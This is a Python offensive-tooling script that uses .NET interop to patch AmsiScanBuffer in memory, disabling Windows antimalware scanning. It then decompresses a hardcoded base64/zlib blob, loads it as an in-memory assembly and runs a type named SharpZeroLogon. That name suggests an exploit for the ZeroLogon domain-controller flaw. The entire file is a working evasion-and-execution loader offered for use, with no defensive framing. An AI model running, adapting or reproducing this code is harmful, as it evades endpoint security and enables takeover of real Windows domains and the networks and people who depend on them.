import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpZeroLogon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()